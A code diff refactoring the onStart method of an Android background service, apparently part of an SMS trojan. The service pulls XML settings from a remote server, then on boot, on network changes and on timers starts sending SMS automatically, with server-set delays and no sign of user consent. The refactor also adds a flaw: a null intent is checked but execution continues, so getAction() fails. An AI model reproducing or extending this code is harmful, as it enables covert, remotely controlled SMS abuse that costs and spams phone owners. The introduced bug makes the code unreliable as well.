@@ -188,46 +188,49 @@ public class BgService extends Service {
     @Override
     public void onStart(Intent intent, int startId) {
         super.onStart(intent, startId);
-        
         LOGD("onStart action = " + (intent != null ? intent.getAction() : ""));
-        SettingManager sm = SettingManager.getInstance(this);
-        sm.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
-        if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET) == true) {
+        mSM.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
+        
+        if (intent == null || intent.getAction() == null) {
+            mSM.tryToFetchInfoFromServer(0);
+        }
+        
+        String action = intent.getAction();
+        if (action.equals(ACTION_INTERNET) == true) {
             LOGD("[[onStart]] received the action to get the internet info");
-            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
+            boolean ret = mSM.getXMLInfoFromServer();
             if (ret == true) {
-                SettingManager.getInstance(this).parseServerXMLInfo();
-                String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+                mSM.parseServerXMLInfo();
+                String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                 long delayTime = 0;
                 if (delay != null) {
                     delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
                 }
                 LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
-                sm.setLastConnectServerTime(System.currentTimeMillis());
-                SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
+                mSM.setLastConnectServerTime(System.currentTimeMillis());
+                mSM.tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true && mStartSMSAfterInternet == true) {
-                    long sms_delay_time = sm.getSMSSendDelay();
-                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                     mStartSMSAfterInternet = false;
                 } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
                     //TODO : start vedio download alarm
                     mStartSMSAfterInternet = false;
                 }
             } else {
-                sm.setInternetConnectFailed(true);
+                mSM.setInternetConnectFailed(true);
             }
-        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS) == true) {
+        } else if (action.equals(ACTION_SEND_SMS) == true) {
             LOGD("[[onStart]] start send the sms for one cycle");
             boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
             if (ret == true) {
-                SettingManager.getInstance(this).parseServerXMLInfo();
+                mSM.parseServerXMLInfo();
                 mSM.log(TAG, "start send the sms for one cycle");
-                SettingManager.getInstance(this).startOneRoundSMSSend(0);
+                mSM.startOneRoundSMSSend(0);
                 mSM.log("cancel the auto message send now and start it after this round sms send");
                 mSM.cancelAutoSendMessage();
                 mSM.setSMSBlockBeginTime(System.currentTimeMillis());
             } else {
-                sm.setInternetConnectFailedBeforeSMS(true);
+                mSM.setInternetConnectFailedBeforeSMS(true);
 //                long false_retry_time = ((long) 1) * 3600 * 1000;
 //                sm.setSMSSendDelay(false_retry_time);
 //                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
@@ -235,12 +238,12 @@ public class BgService extends Service {
             if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
                 mSM.setSMSRoundTotalSnedCount(0);
             }
-        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_SEND_SMS_ROUND) == true) {
+        } else if (action.equals(ACTION_SEND_SMS_ROUND) == true) {
             mSM.log("receive the action = " + intent.getAction());
             oneRoundSMSSend();
-        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_BOOT) == true) {
+        } else if (action.equals(ACTION_BOOT) == true) {
             mSM.log("action is not filtered use the default logic");
-            File file = new File(SettingManager.getInstance(getApplicationContext()).DOWNLOAD_FILE_PATH);
+            File file = new File(mSM.DOWNLOAD_FILE_PATH);
             if (file.exists() == true) {
                 mSM.parseServerXMLInfo();
                 String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
@@ -250,8 +253,7 @@ public class BgService extends Service {
                 }
                 mSM.tryToFetchInfoFromServer(delayTime);
                 if (isSendSMS() == true) {
-                    long sms_delay_time = sm.getSMSSendDelay();
-                    SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                     mStartSMSAfterInternet = false;
                 } else if (isDownloadVedio() == true) {
                     //TODO : start download vedio process alarm
@@ -260,37 +262,36 @@ public class BgService extends Service {
             } else {
                 mSM.tryToFetchInfoFromServer(0);
             }
-        } else if (intent != null && intent.getAction() != null && intent.getAction().equals(ACTION_INTERNET_CHANGED) == true) {
+        } else if (action.equals(ACTION_INTERNET_CHANGED) == true) {
             boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer();
             LOGD("action internet connection");
-            sm.log("action = " + ACTION_INTERNET_CHANGED);
+            mSM.log("action = " + ACTION_INTERNET_CHANGED);
             if (ret == true) {
-                if (sm.getInternetConnectFailed() == true) {
-                    sm.log("only connect the internet and make some settings");
-                    sm.setInternetConnectFailed(false);
-                    SettingManager.getInstance(this).parseServerXMLInfo();
-                    String delay = SettingManager.getInstance(this).mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
+                if (mSM.getInternetConnectFailed() == true) {
+                    mSM.log("only connect the internet and make some settings");
+                    mSM.setInternetConnectFailed(false);
+                    mSM.parseServerXMLInfo();
+                    String delay = mSM.mXMLHandler.getChanneInfo(XMLHandler.NEXT_LINK_BASE);
                     long delayTime = 0;
                     if (delay != null) {
                         delayTime = (Long.valueOf(delay)) * 60 * 60 * 1000;
                     }
                     LOGD("[[onStart]] change the internet connect time delay, and start send the auto sms");
-                    sm.setLastConnectServerTime(System.currentTimeMillis());
-                    SettingManager.getInstance(this).tryToFetchInfoFromServer(delayTime);
+                    mSM.setLastConnectServerTime(System.currentTimeMillis());
+                    mSM.tryToFetchInfoFromServer(delayTime);
                     if (isSendSMS() == true && mStartSMSAfterInternet == true) {
-                        long sms_delay_time = sm.getSMSSendDelay();
-                        SettingManager.getInstance(this).startAutoSendMessage(0, sms_delay_time);
+                        mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
                         mStartSMSAfterInternet = false;
                     } else if (isDownloadVedio() == true && mStartSMSAfterInternet == true) {
                         //TODO : start vedio download alarm
                         mStartSMSAfterInternet = false;
                     }
                 }
-                if (sm.getInternetConnectFailedBeforeSMS() == true) {
-                    sm.setInternetConnectFailedBeforeSMS(false);
-                    SettingManager.getInstance(this).parseServerXMLInfo();
+                if (mSM.getInternetConnectFailedBeforeSMS() == true) {
+                    mSM.setInternetConnectFailedBeforeSMS(false);
+                    mSM.parseServerXMLInfo();
                     mSM.log(TAG, "start send the sms for one cycle");
-                    SettingManager.getInstance(this).startOneRoundSMSSend(0);
+                    mSM.startOneRoundSMSSend(0);
                     mSM.log("cancel the auto message send now and start it after this round sms send");
                     mSM.cancelAutoSendMessage();
                     mSM.setSMSBlockBeginTime(System.currentTimeMillis());
